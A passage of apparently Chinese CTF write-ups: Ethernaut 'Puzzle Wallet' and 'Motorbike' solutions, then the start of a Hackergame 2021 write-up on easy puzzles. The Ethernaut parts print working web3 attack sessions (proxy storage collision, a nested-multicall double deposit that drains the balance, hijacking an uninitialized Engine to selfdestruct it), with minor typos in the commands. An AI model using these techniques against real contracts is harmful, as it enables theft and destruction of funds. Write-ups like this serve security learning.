require(pendingAdmin == _expectedAdmin, \"Expected new admin by the current admin is not the pending admin\");\n        admin = pendingAdmin;\n    }\n\n    function upgradeTo(address _newImplementation) external onlyAdmin {\n        _upgradeTo(_newImplementation);\n    }\n}\n\ncontract PuzzleWallet {\n    using SafeMath for uint256;\n    address public owner;\n    uint256 public maxBalance;\n    mapping(address =&gt; bool) public whitelisted;\n    mapping(address =&gt; uint256) public balances;\n\n    function init(uint256 _maxBalance) public {\n        require(maxBalance == 0, \"Already initialized\");\n        maxBalance = _maxBalance;\n        owner = msg.sender;\n    }\n\n    modifier onlyWhitelisted {\n        require(whitelisted[msg.sender], \"Not whitelisted\");\n        _;\n    }\n\n    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {\n        require(address(this).balance == 0, \"Contract balance is not 0\");\n        maxBalance = _maxBalance;\n    }\n\n    function addToWhitelist(address addr) external {\n        require(msg.sender == owner, \"Not the owner\");\n        whitelisted[addr] = true;\n    }\n\n    function deposit() external payable onlyWhitelisted {\n        require(address(this).balance &lt;= maxBalance, \"Max balance reached\");\n        balances[msg.sender] = balances[msg.sender].add(msg.value);\n    }\n\n    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {\n        require(balances[msg.sender] &gt;= value, \"Insufficient balance\");\n        balances[msg.sender] = balances[msg.sender].sub(value);\n        (bool success, ) = to.call{ value: value }(data);\n        require(success, \"Execution failed\");\n    }\n\n    function multicall(bytes[] calldata data) external payable onlyWhitelisted {\n        bool depositCalled = false;\n        for (uint256 i = 0; i &lt; data.length; i++) {\n            bytes memory _data = data[i];\n            bytes4 selector;\n            assembly {\n                selector := mload(add(_data, 32))\n            }\n            if (selector == this.deposit.selector) {\n                require(!depositCalled, \"Deposit can only be called once\");\n                // Protect against reusing msg.value\n                depositCalled = true;\n            }\n            (bool success, ) = address(this).delegatecall(data[i]);\n            require(success, \"Error while delegating call\");\n        }\n    }\n}\n</code></pre> <p>\u9898\u76ee\u6bd4\u8f83\u590d\u6742\uff0c\u6700\u7ec8\u76ee\u7684\u662f\u4f7f PuzzleProxy \u7684 admin \u4e3a player</p> <p>\u56e0\u4e3a PuzzleProxy \u548c PuzzleWallet \u90e8\u7f72\u5728\u540c\u4e00\u4e2a\u5730\u5740\u4e0a\uff0c\u5b83\u4eec\u7684 storage \u4f1a\u5171\u7528\uff0c\u6240\u4ee5\u5c31\u5bfc\u81f4\u4e86 PuzzleProxy \u7684 pendingAdmin \u5bf9\u5e94\u4e86 PuzzleWallet \u7684 owner\uff0cPuzzleWallet \u7684 maxBalance \u5bf9\u5e94\u4e86 PuzzleProxy \u7684 admin</p> <p>\u4ece\u540e\u5f80\u524d\u63a8\uff1a</p> <ul> <li>\u8981\u4f7f admin \u53d8\u4e3a player\uff0c\u5219\u53ef\u4ee5\u8bbe\u7f6e maxBalance \u4e3a player</li> <li>\u800c setMaxBalance \u51fd\u6570\u9700\u8981\u5148\u4f7f\u5f53\u524d\u5408\u7ea6\u8d26\u6237\u7684\u4f59\u989d\u53d8\u4e3a 0</li> <li>\u5408\u7ea6\u8d26\u6237\u4f59\u989d\u51cf\u5c11\u7684\u65b9\u5f0f\u5728 execute \u4e2d\u7684 call\uff0c\u4f7f\u4f59\u989d\u51cf\u5c11 value</li> <li>\u4f46\u8fd9\u6837\u8981\u4f7f balances[player] &gt;= value</li> <li>\u800c\u901a\u8fc7 deposit \u589e\u52a0 balances[player] \u7684\u8bdd\uff0c\u5408\u7ea6\u8d26\u6237\u4f59\u989d\u4e5f\u4f1a\u540c\u6b65\u589e\u52a0</li> <li>\u6240\u4ee5\u8981\u4f7f\u7528 multicall \u51fd\u6570\u6765\u4f7f balances[player] \u589e\u52a0\u91cf\u4e3a\u5408\u7ea6\u8d26\u6237\u4f59\u989d\u589e\u52a0\u91cf\u7684\u4e8c\u500d</li> <li>\u4f46\u662f multicall \u4e2d\u68c0\u6d4b\u4e86 selector \u4f7f deposit \u53ea\u80fd\u8c03\u7528\u4e00\u6b21</li> <li>\u8fd9\u53ef\u4ee5\u901a\u8fc7 multicall \u4e2d\u6267\u884c\u4e24\u4e2a multicall\uff0c\u6bcf\u4e2a multicall \u8c03\u7528\u4e00\u6b21 deposit</li> </ul> <p>\u8fd9\u6837\u5206\u6790\u4e4b\u540e\u95ee\u9898\u5c31\u89e3\u51b3\u4e86\uff0c\u9996\u5148\u8c03\u7528 proposeNewAdmin \u6765\u4f7f pendingAdmin\uff08owner\uff09\u53d8\u4e3a player\uff0c\u8fd9\u4e2a\u51fd\u6570\u4e0d\u80fd\u76f4\u63a5\u8c03\u7528\uff0c\u4f46\u662f\u53ef\u4ee5\u901a\u8fc7\u53d1\u9001\u5408\u7ea6\u7684\u65b9\u5f0f\u8c03\u7528 <pre><code>&gt; await web3.eth.getStorageAt(instance, 0)  // owner\n'0x000000000000000000000000&lt;level address&gt;'\n&gt; web3.utils.sha3(\"proposeNewAdmin(address)\").slice(0, 10)  // selector\n'0xa6376746'\n&gt; data = web3.utils.sha3(\"proposeNewAdmin(address)\").slice(0, 10) + player.slice(2).padStart(64, \"0\")\n'0xa6376746000000000000000000000000&lt;player address&gt;'\n&gt; web3.eth.sendTransaction({from: player, to: instance, data: data})\n&gt; await web3.eth.getStorageAt(instance, 0)\n'0x000000000000000000000000&lt;player address&gt;'\n</code></pre></p> <p>\u7136\u540e\u62ff\u5230 owner \u540e\u9700\u8981\u5c06\u81ea\u5df1\u52a0\u5165\u767d\u540d\u5355\uff0c\u5e76\u4e14\u5148\u67e5\u8be2\u4e00\u4e0b\u5408\u7ea6\u8d26\u6237\u4f59\u989d <pre><code>&gt; await contract.addToWhitelist(player)\n&gt; await getBalance(instance)\n'0.001'\n</code></pre></p> <p>\u6240\u4ee5\u9700\u8981\u6784\u9020\u4e00\u4e2a calldata\uff0c\u5b83\u4f1a\u901a\u8fc7 multicall \u8c03\u7528 deposit\uff0c\u7136\u540e\u628a\u4e24\u4e2a\u8fd9\u4e2a calldata \u4f20\u5165 multicall\uff0c\u540c\u65f6\u9644\u5e26 value 0.001 ether\uff0c\u8fd9\u6837 balances[player] \u5c31\u4f1a\u589e\u52a0 0.002 ether\uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u901a\u8fc7 execute \u76f4\u63a5\u63d0\u53d6\u51fa\u8fd9 0.002 ether</p> <p>\u63d0\u53d6\u540e\u5408\u7ea6\u8d26\u6237\u7684 balance \u53d8\u4e3a 0\uff0c\u5c31\u53ef\u4ee5\u8bbe\u7f6e maxBalance \u4e86 <pre><code>&gt; web3.utils.sha3(\"deposit()\").slice(0, 10) // deposit selector\n'0xd0e30db0'\n&gt; data = (await contract.methods[\"multicall(bytes[])\"].request([\"0xd0e30db0\"])).data // \u6784\u9020\u901a\u8fc7 multicall \u8c03\u7528 deposit \u7684 calldata\n'0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000'\n&gt; await contract.multicall([data, data], {value: toWei(\"0.001\")})\n&gt; await getBalance(instance)\n'0.002'\n&gt; contract.execute(player, toWei(\"0.002\"), 0\n&gt; await getBalance(instance)\n'0'\n&gt; await web3.eth.getStorageAt(instance, 1)\n'0x000000000000000000000000&lt;level address&gt;'\n&gt; contract.setMaxBalance(player)\n&gt; await web3.eth.getStorageAt(instance, 1)\n'0x000000000000000000000000&lt;player address&gt;'\n</code></pre></p>"},{"location":"writeups/ethernaut/#motorbike","title":"Motorbike","text":"\u9898\u76ee\u5408\u7ea6 <pre><code>// SPDX-License-Identifier: MIT\n\npragma solidity &lt;0.7.0;\n\nimport \"@openzeppelin/contracts/utils/Address.sol\";\nimport \"@openzeppelin/contracts/proxy/Initializable.sol\";\n\ncontract Motorbike {\n    // keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1\n    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n\n    struct AddressSlot {\n        address value;\n    }\n\n    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.\n    constructor(address _logic) public {\n        require(Address.isContract(_logic), \"ERC1967: new implementation is not a contract\");\n        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;\n        (bool success,) = _logic.delegatecall(\n            abi.encodeWithSignature(\"initialize()\")\n        );\n        require(success, \"Call failed\");\n    }\n\n    // Delegates the current call to `implementation`.\n    function _delegate(address implementation) internal virtual {\n        // solhint-disable-next-line no-inline-assembly\n        assembly {\n            calldatacopy(0, 0, calldatasize())\n            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)\n            returndatacopy(0, 0, returndatasize())\n            switch result\n            case 0 { revert(0, returndatasize()) }\n            default { return(0, returndatasize()) }\n        }\n    }\n\n    // Fallback function that delegates calls to the address returned by `_implementation()`. \n    // Will run if no other function in the contract matches the call data\n    fallback () external payable virtual {\n        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);\n    }\n\n    // Returns an `AddressSlot` with member `value` located at `slot`.\n    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {\n        assembly {\n            r_slot := slot\n        }\n    }\n}\n\ncontract Engine is Initializable {\n    // keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1\n    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n\n    address public upgrader;\n    uint256 public horsePower;\n\n    struct AddressSlot {\n        address value;\n    }\n\n    function initialize() external initializer {\n        horsePower = 1000;\n        upgrader = msg.sender;\n    }\n\n    // Upgrade the implementation of the proxy to `newImplementation`\n    // subsequently execute the function call\n    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {\n        _authorizeUpgrade();\n        _upgradeToAndCall(newImplementation, data);\n    }\n\n    // Restrict to upgrader role\n    function _authorizeUpgrade() internal view {\n        require(msg.sender == upgrader, \"Can't upgrade\");\n    }\n\n    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.\n    function _upgradeToAndCall(\n        address newImplementation,\n        bytes memory data\n    ) internal {\n        // Initial upgrade and setup call\n        _setImplementation(newImplementation);\n        if (data.length &gt; 0) {\n            (bool success,) = newImplementation.delegatecall(data);\n            require(success, \"Call failed\");\n        }\n    }\n\n    // Stores a new address in the EIP1967 implementation slot.\n    function _setImplementation(address newImplementation) private {\n        require(Address.isContract(newImplementation), \"ERC1967: new implementation is not a contract\");\n\n        AddressSlot storage r;\n        assembly {\n            r_slot := _IMPLEMENTATION_SLOT\n        }\n        r.value = newImplementation;\n    }\n}\n</code></pre> <p>\u540c\u6837\u6709\u4e9b\u590d\u6742\uff0c\u6700\u7ec8\u76ee\u7684\u662f\u8981\u9500\u6bc1\u6389 Engine</p> <p>\u56e0\u4e3a\u6574\u4e2a\u5408\u7ea6\u4e2d\u90fd\u6ca1\u6709 selfdestruct\uff0c\u6240\u4ee5\u8981\u8f7d\u5165\u81ea\u5df1\u7684\u5408\u7ea6\uff0c\u53ef\u4ee5\u901a\u8fc7 upgradeToAndCall \u51fd\u6570\u6765\u8f7d\u5165\u5408\u7ea6\u5e76\u8c03\u7528\uff0c\u8fd9\u9700\u8981\u901a\u8fc7 _authorizeUpgrade \u51fd\u6570\u7684\u68c0\u67e5\uff0c\u4e5f\u5c31\u662f\u68c0\u67e5 sender \u662f\u5426\u662f upgrader\uff0c\u800c\u6539\u53d8 upgrader \u53ef\u4ee5\u901a\u8fc7 initialize \u51fd\u6570\u6765\u5b8c\u6210</p> <p>\u6240\u4ee5\u653b\u51fb\u6d41\u7a0b\u5c31\u662f\u5148\u901a\u8fc7 getStorageAt \u6765\u5f97\u5230\u90e8\u7f72\u7684 Engine \u7684\u5730\u5740\uff0c\u7136\u540e\u8c03\u7528 initialize\uff0cupgradeToAndCall \u4e00\u4e2a\u90e8\u7f72\u7684\u65b0\u5408\u7ea6\uff0c\u8ba9\u5b83\u89e6\u53d1 selfdestruct \u5c31\u597d\u4e86</p> <p>\u65b0\u5408\u7ea6\uff1a <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ncontract Exploit {\n    function exp() public {\n        selfdestruct(payable(0));\n    }\n}\n</code></pre></p> <p>\u653b\u51fb\u6d41\u7a0b\uff1a <pre><code>&gt; await web3.eth.getStorageAt(instance, \"0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc\")\n'0x000000000000000000000000&lt;engine address&gt;'\n&gt; engine = \"0x&lt;engine address&gt;\"\n&gt; data = web3.utils.sha3(\"initialize()\").slice(0, 10)\n'0x8129fc1c'\n&gt; web3.eth.sendTransaction({from: player, to: engine, data: data})\n&gt; await web3.eth.call({from: player, to: engine, data: web3.utils.sha3(\"upgrader()\").slice(0, 10)}) // \u9a8c\u8bc1 upgrader\n'0x000000000000000000000000&lt;player address&gt;'\n&gt; exp = \"&lt;Exploit contract address&gt;\"\n&gt; expdata = web3.utils.sha3(\"exp()\").slice(0, 10)\n'0xab60ffda'\n&gt; signature = {\n    name: 'upgradeToAndCall',\n    type: 'function',\n    inputs: [\n        {\n            type: 'address',\n            name: 'newImplementation'\n        },\n        {\n            type: 'bytes memory',\n            name: 'data'\n        }\n    ]\n}\n{name: 'upgradeToAndCall', type: 'function', inputs: Array(2)}\n&gt; data = web3.eth.abi.encodeFunctionCall(upgradeSignature, [exp, expdata])\n'0x4f1ef286000000000000000000000000700f6c75bffc3e6379bfa14cf050127c15a5573900000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000004ab60ffda00000000000000000000000000000000000000000000000000000000'\n&gt; web3.eth.sendTransaction({from: player, to: engine, data: data})\n</code></pre></p>"},{"location":"writeups/hackergame2021/","title":"Hackergame 2021 Writeup","text":"<p> \u7ea6 9370 \u4e2a\u5b57  286 \u884c\u4ee3\u7801  38 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 35 \u5206\u949f</p> <p>Abstract</p> <p>\u53c2\u52a0\u7684\u7b2c\u4e00\u4e2a\u53ef\u4ee5\u7b97\u662f CTF \u7684\u6bd4\u8d5b\u3002\u8fd9\u91cc\u662f\u6211\u505a\u51fa\u7684\u9898\u7684 writeup\uff0c\u535a\u5ba2\u7248\u5728\uff1ahttps://blog.tonycrane.cc/p/c05d7b7c.html</p> <p>\u5b98\u65b9 writeup</p>"},{"location":"writeups/hackergame2021/#_1","title":"\u7b7e\u5230","text":"<p>\u4e3a\u4e86\u80fd\u8ba9\u5927\u5bb6\u987a\u5229\u7b7e\u5230\uff0c\u547d\u9898\u7ec4\u628a\u6bcf\u4e00\u79d2\u7684 flag \u90fd\u8bb0\u5f55\u4e0b\u6765\u5236\u6210\u4e86\u65e5\u8bb0\u672c\u7684\u4e00\u9875\u3002\u4f60\u53ea\u9700\u8981\u6253\u5f00\u65e5\u8bb0\uff0c\u7ffb\u5230 Hackergame 2021 \u6bd4\u8d5b\u8fdb\u884c\u671f\u95f4\u7684\u4efb\u4f55\u4e00\u9875\u5c31\u80fd\u5f97\u5230 flag\uff01</p> <p>\u5f88\u660e\u786e\uff0c\u8fdb\u5165\u7f51\u5740\u540e\u4e00\u76f4\u70b9 Next \u7ffb\u5230\u6bd4\u8d5b\u65f6\u95f4\u5c31\u597d\u4e86\uff08\u8bef</p> <p>\u770b\u5230\u4e86 URI \u91cc\u6709 <code>?page=...</code>\uff0c\u6240\u4ee5\u4e5f\u61d2\u5f97\u8ba1\u7b97\u4e86\uff0c\u624b\u52a8\u4e8c\u5206\uff0c\u5927\u6982 <code>?page=1635000000</code> \u5de6\u53f3\u5c31\u53ef\u4ee5\u770b\u5230 flag \u4e86</p> <p>\u8d5b\u540e\u624d\u53cd\u5e94\u8fc7\u6765\u539f\u6765\u662f UNIX \u65f6\u95f4\u6233</p>"},{"location":"writeups/hackergame2021/#_2","title":"\u8fdb\u5236\u5341\u516d\u2014\u2014\u53c2\u4e0a","text":"<p> \u4e5f\u5f88\u660e\u786e\uff0c\u76f4\u63a5\u628a\u53f3\u4fa7\u6321\u4f4f\u7684 flag \u90e8\u5206\u5bf9\u5e94\u5de6\u8fb9\u7684\u5341\u516d\u8fdb\u5236\u6570\u6362\u7b97\u6210\u5341\u8fdb\u5236\uff0c\u7136\u540e\u6839\u636e ASCII \u7801\u8f6c\u6210\u5b57\u7b26\u3002\u6216\u8005\u76f4\u63a5\u628a\u5de6\u4fa7\u6284\u8fdb Hex Friend \u4e5f\u53ef\u4ee5\u76f4\u63a5\u5f97\u5230\u53f3\u4fa7\u7684flag\u3002</p> <p>\uff08**\u5f53\u65f6\u8fd9\u9898\u6284\u4e32\u884c\u4e86\u4e24\u4e09\u6b21\u2026\u2026\uff09</p>"},{"location":"writeups/hackergame2021/#_3","title":"\u53bb\u5427\uff01\u8ffd\u5bfb\u81ea\u7531\u7684\u7535\u6ce2","text":"<p>\u5f53\u7136\uff0c\u5982\u679c\u53ea\u662f\u8fd9\u6837\u8fd8\u8fdc\u8fdc\u4e0d\u591f\u3002\u9075\u4f9d\u53f2\u79f0\u201c\u8001\u7239\u201d\u7684\u4e0a\u53e4\u5148\u8d24\u7684\u81f3\u7406\u540d\u8a00\uff0c\u5fc5\u987b\u8981\u201c\u7528\u9b54\u6cd5\u6253\u8d25\u9b54\u6cd5\u201d\u3002X \u540c\u5b66\u5411\u4e0a\u7ea7\u7533\u8bf7\u5230\u4e86\u79d1\u5927\u897f\u533a\u540c\u6b65\u8f90\u5c04\u5b9e\u9a8c\u5ba4\u8bbe\u5907\u7684\u4f7f\u7528\u6743\u9650\uff0c\u4ee5\u6b64\u6253\u901a\u6b21\u5143\u7a7a\u95f4\uff0c\u501f\u52a9\u5230\u53e6\u4e00\u4e2a\u5e73\u884c\u5b87\u5b99\u4e2d Z \u540c\u5b66\u7684\u6cd5\u529b\u8fdb\u884c\u6570\u636e\u5bf9\u51b2\uff0c\u65b9\u624d\u4e8e\u4e71\u4e2d\u640f\u5f97\u4e00\u4e1d\u673a\u4f1a\uff0c\u5c06 flag \u7528\u65e0\u7ebf\u7535\u7684\u5f62\u5f0f\u53d1\u5c04\u4e86\u51fa\u53bb\u3002</p> <p>\u8003\u8651\u5230\u4fe1\u606f\u7684\u9c81\u68d2\u6027\uff0cX \u540c\u5b66\u4f7f\u7528\u4e86\u65e0\u7ebf\u7535\u4e2d\u60ef\u7528\u7684\u65b9\u6cd5\u6765\u533a\u5206\u5b57\u7b26\u4e32\u4e2d\u8bfb\u97f3\u76f8\u8fd1\u7684\u5b57\u6bcd\u3002\u5373\u4f7f\u5982\u6b64\uff0c\u6253\u7834\u6b21\u5143\u7684\u5f3a\u5927\u80fd\u91cf\u626d\u66f2\u4e86\u65f6\u7a7a\uff0c\u4f7f\u5f97\u6700\u7ec8\u63a5\u53d7\u5230\u7684\u5f55\u97f3\u7684\u901f\u5ea6\u6709\u6240\u6539\u53d8\u3002</p> <p>\uff08\u8fd9\u9898\u5728\u7fa4\u91cc\u770b\u8d77\u6765\u597d\u50cf\u5361\u4e86\u5f88\u591a\u4eba\uff0c\u4e0d\u77e5\u9053\u4e3a\u4ec0\u4e48\uff09 \u9898\u76ee\u4e0b\u8f7d\u4e0b\u6765\u662f\u4e00\u4e2a\u542c\u8d77\u6765\u6742\u4e71\u7684\u97f3\u9891</p> <p>\u9898\u91cc\u6700\u540e\u8bf4\u4e86 \u201c\u6700\u7ec8\u63a5\u53d7\u5230\u7684\u5f55\u97f3\u7684\u901f\u5ea6\u6709\u6240\u6539\u53d8\u201d\uff0c\u6240\u4ee5\u8003\u8651\u5c06\u97f3\u9891\u65f6\u95f4\u62c9\u957f\u3002 \u6700\u5f00\u59cb\u4f7f\u7528\u4e86 Adobe Audition\uff0c\u4f46\u662f\u6548\u679c\u4e0d\u662f\u5f88\u7406\u60f3\uff0c\u5927\u6982\u662f\u91cd\u65b0\u91c7\u6837\u7b49\u4e00\u7cfb\u5217\u7b97\u6cd5\u5bfc\u81f4\u7684 \u6240\u4ee5\u6362\u4e86 Adobe Premier Pro \u76f4\u63a5\u7528\u6bd4\u7387\u62c9\u4f38\u5de5\u5177\u62c9\u957f\u97f3\u9891\uff0c\u8fd8\u662f\u53ef\u4ee5\u542c\u6e05\u7684 \u4e0d\u65ad\u5c1d\u8bd5\u4e4b\u540e\uff0c\u5927\u6982\u653e\u6162\u4e09\u500d\u5de6\u53f3\u5c31\u53ef\u4ee5\u542c\u51fa\u8bfb\u7684\u662f\u82f1\u8bed\u5355\u8bcd\u4e86</p> <p>\u9898\u91cc\u8bf4\u5230\u4e86 \u201c\u8003\u8651\u5230\u4fe1\u606f\u7684\u9c81\u68d2\u6027\uff0cX \u540c\u5b66\u4f7f\u7528\u4e86\u65e0\u7ebf\u7535\u4e2d\u60ef\u7528\u7684\u65b9\u6cd5\u6765\u533a\u5206\u5b57\u7b26\u4e32\u4e2d\u8bfb\u97f3\u76f8\u8fd1\u7684\u5b57\u6bcd\u201d\uff0c\u6240\u4ee5\u5c31\u67e5\u5230\u4e86\u56fd\u9645\u822a\u7a7a\u65e0\u7ebf\u7535\u901a\u8baf26\u4e2a\u82f1\u6587\u5b57\u6bcd\u8bfb\u6cd5 \u7136\u540e\u4ed4\u7ec6\u542c\uff0c\u8fa8\u522b\u6bcf\u4e2a\u5355\u8bcd\u7684\u7b2c\u4e00\u4e2a\u97f3\u5c31\u53ef\u4ee5\u5f97\u5230 flag \u4e86</p>"},{"location":"writeups/hackergame2021/#pro-max","title":"\u732b\u54aa\u95ee\u7b54 Pro Max","text":"<p>\u4e94\u9053\u5201\u94bb\u7684\u9898\u76ee\uff0c\u4f46\u662f\u8fd8\u662f\u597d\u67e5\u5230\u7684\uff0c\u9898\u76ee\u91cc\u4e5f\u8bf4\u4e86\u201c\u89e3\u51fa\u8c1c\u9898\u4e0d\u9700\u8981\u662f\u79d1\u5927\u5728\u6821\u5b66\u751f\u201d</p> <ol> <li>2017 \u5e74\uff0c\u4e2d\u79d1\u5927\u4fe1\u606f\u5b89\u5168\u4ff1\u4e50\u90e8\uff08SEC@USTC\uff09\u5e76\u5165\u4e2d\u79d1\u5927 Linux \u7528\u6237\u534f\u4f1a\uff08USTCLUG\uff09\u3002\u76ee\u524d\uff0c\u4fe1\u606f\u5b89\u5168\u4ff1\u4e50\u90e8\u7684\u57df\u540d\uff08sec.ustc.edu.cn\uff09\u5df2\u7ecf\u65e0\u6cd5\u8bbf\u95ee\uff0c\u4f46\u4f60\u80fd\u627e\u5230\u4fe1\u606f\u5b89\u5168\u4ff1\u4e50\u90e8\u7684\u793e\u56e2\u7ae0\u7a0b\u5728\u54ea\u4e00\u5929\u7684\u4f1a\u5458\u4ee3\u8868\u5927\u4f1a\u4e0a\u901a\u8fc7\u7684\u5417\uff1f</li> </ol> <p>\u770b\u5230\u4e86 \u201c\u76ee\u524d\uff0c\u5df2\u7ecf\u65e0\u6cd5\u8bbf\u95ee\u201d \u8bf4\u660e\u8fd9\u4e2a\u57df\u540d\u66fe\u7ecf\u662f\u53ef\u4ee5\u8bbf\u95ee\u7684\uff0c\u76f4\u63a5\u901a\u8fc7 \u4e92\u8054\u7f51\u7684\u8bb0\u5fc6 archive.org\uff0c\u67e5\u5230\u8fd9\u4e2a\u57df\u540d\u7684\u5386\u53f2\u5b58\u6863\uff0c\u968f\u4fbf\u627e\u4e00\u5929\u5c31\u53ef\u4ee5\u770b\u5230\u4ed6\u4eec\u5b98\u7f51\u4e2d\u7684\u4fe1\u606f\u5b89\u5168\u4ff1\u4e50\u90e8\u793e\u56e2\u7ae0\u7a0b\u3002 \u5176\u4e2d\u7b2c\u4e00\u884c\u5c31\u5199\u4e86 \u201c\u672c\u7ae0\u7a0b\u5728 2015 \u5e74 5 \u6708 4 \u65e5\uff0c\u7ecf\u4f1a\u5458\u4ee3\u8868\u5927\u4f1a\u5ba1\u8bae\u901a\u8fc7\u3002\u201d</p> <p>\u6240\u4ee5\u7b54\u6848\u5c31\u662f 20150504</p> <ol> <li>\u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66 Linux \u7528\u6237\u534f\u4f1a\u5728\u8fd1\u4e94\u5e74\u591a\u5c11\u6b21\u88ab\u8bc4\u4e3a\u6821\u4e94\u661f\u7ea7\u793e\u56e2\uff1f</li> </ol> <p>\u76f4\u63a5\u53bb\u79d1\u5927 LUG \u5b98\u7f51\u7684 Intro \u9875\u9762\uff0c\u5c31\u53ef\u4ee5\u770b\u5230 \u201c\u4e8e 2015 \u5e74 5 \u6708\u30012017 \u5e74 7 \u6708\u30012018 \u5e74 9 \u6708\u30012019 \u5e74 8 \u6708\u53ca 2020 \u5e74 9 \u6708\u88ab\u8bc4\u4e3a\u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66\u4e94\u661f\u7ea7\u5b66\u751f\u793e\u56e2\u3002\u201d \u6240\u4ee5\u662f4\u6b21\uff08x  \u4f46\u662f\u6000\u7591\u4e00\u4e0b\u4e3a\u4ec0\u4e48\u6ca1\u67092021\u5e74\uff0c\u56e0\u4e3a\u90fd\u662f\u57289\u6708\u4efd\u5de6\u53f3\uff0c\u6240\u4ee5\u53ef\u80fd\u662f\u6570\u636e\u6ca1\u66f4\u65b0\uff0c\u8fd9\u98984\u548c5\u90fd\u6709\u53ef\u80fd</p> <p>\u5c1d\u8bd5\u540e\u5f97\u5230\u7b54\u6848\u662f 5</p> <ol> <li>\u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66 Linux \u7528\u6237\u534f\u4f1a\u4f4d\u4e8e\u897f\u533a\u56fe\u4e66\u9986\u7684\u6d3b\u52a8\u5ba4\u95e8\u53e3\u7684\u724c\u5b50\u4e0a\u201cLUG @ USTC\u201d\u4e0b\u65b9\u7684\u5c0f\u5b57\u662f\uff1f</li> </ol> <p>\u8fd9\u9898\u4e5f\u7b80\u5355\uff0c\u76f4\u63a5\u95ee\u79d1\u5927\u540c\u5b66\u5c31\u597d\u4e86\uff08x  \u7ffb\u4e86 LUG \u7684\u5fae\u4fe1\u516c\u4f17\u53f7\u548c QQ \u5b98\u65b9\u53f7\uff0c\u90fd\u6ca1\u5565\u6536\u83b7\uff0c\u6700\u540e\u53d1\u73b0\u5b98\u7f51\u4e0a\u6709 News\u3002\u8fd9\u6837\u7684\u8bdd\uff0c\u5982\u679c\u65b0\u542f\u7528\u6d3b\u52a8\u5ba4\u7684\u8bdd\uff0c\u4e00\u5b9a\u4f1a\u6709\u4e00\u7bc7\u65b0\u95fb\u7a3f\uff0c\u641c\u7d22\u201c\u56fe\u4e66\u9986\u201d\u5f97\u5230\u4e86\u300c\u897f\u533a\u56fe\u4e66\u9986\u65b0\u6d3b\u52a8\u5ba4\u542f\u7528\u300d\u8fd9\u7bc7\u6587\u7ae0\uff0c\u5f00\u7bc7\u7b2c\u4e00\u5f20\u5927\u56fe\u5c31\u662f\u95e8\u53e3\u724c\u5b50\u7684\u7167\u7247</p> <p>\u6240\u4ee5\u7b54\u6848\u662f Development Team of Library \uff08\u6ce8\u610f\u5927\u5c0f\u5199\uff09</p> <ol> <li>\u5728 SIGBOVIK 2021 \u7684\u4e00\u7bc7\u5173\u4e8e\u4e8c\u8fdb\u5236 Newcomb-Benford \u5b9a\u5f8b\u7684\u8bba\u6587\u4e2d\uff0c\u4f5c\u8005\u4e00\u5171\u5c55\u793a\u4e86\u591a\u5c11\u4e2a\u6570\u636e\u96c6\u5bf9\u5176\u7406\u8bba\u7ed3\u679c\u8fdb\u884c\u9a8c\u8bc1\uff1f</li> </ol> <p>\u5e94\u8be5\u6ca1\u5fc5\u8981\u641c\u8c37\u6b4c\u5b66\u672f\u4e4b\u7c7b\u7684\uff0c\u76f4\u63a5\u5fc5\u5e94\u67e5 \u201cSIGBOVIK Newcomb-Benford\u201d \u5c31\u53ef\u4ee5\u627e\u5230 SIGBOVIK \u7684\u8fd9\u4e00\u7bc7\u5927\u6587\u7ae0\u5408\u96c6\uff0c\u518d\u641c\u7d22 Newcomb \u5c31\u53ef\u4ee5\u770b\u5230\u9898\u76ee\u91cc\u8bf4\u7684\u8bba\u6587\u4e86\u3002 \u5168\u6587\u4e5f\u4e0d\u957f\uff0c\u53ea\u6709\u56db\u9875\uff0c\u540e\u4e24\u9875\u5168\u662f\u6570\u636e\u7684\u56fe\uff0c\u6570\u4e00\u4e0b\uff0c\u4e00\u5171\u670913\u5e45</p> <p>\u6240\u4ee5\u7b54\u6848\u662f 13</p> <ol> <li>\u4e0d\u4e25\u683c\u9075\u5faa\u534f\u8bae\u89c4\u8303\u7684\u64cd\u4f5c\u7740\u5b9e\u4ee4\u4eba\u751f\u538c\uff0c\u597d\u5728 IETF \u4e8e 2021 \u5e74\u6210\u7acb\u4e86 Protocol Police \u4ee5\u76d1\u7763\u5e76\u60e9\u6212\u6240\u6709\u8fdd\u80cc RFC \u6587\u6863\u7684\u884c\u4e3a\u4e2a\u4f53\u3002\u5047\u5982\u4f60\u53d1\u73b0\u4e86\u67d0\u4f4d\u540c\u5b66\u53ef\u80fd\u8fdd\u53cd\u4e86\u534f\u8bae\u89c4\u8303\uff0c\u6839\u636e Protocol Police \u76f8\u5173\u6587\u6863\u4e2d\u89c4\u5b9a\u7684\u4e3e\u62a5\u65b9\u6cd5\uff0c\u4f60\u5e94\u8be5\u5c06\u4f60\u7684\u4e3e\u62a5\u4fe1\u53d1\u5f80\u4f55\u5904\uff1f</li> </ol> <p>\u6ca1\u5565\u597d\u8bf4\u7684\uff0c\u76f4\u63a5\u67e5\uff0c\u7b54\u6848 /dev/null</p> 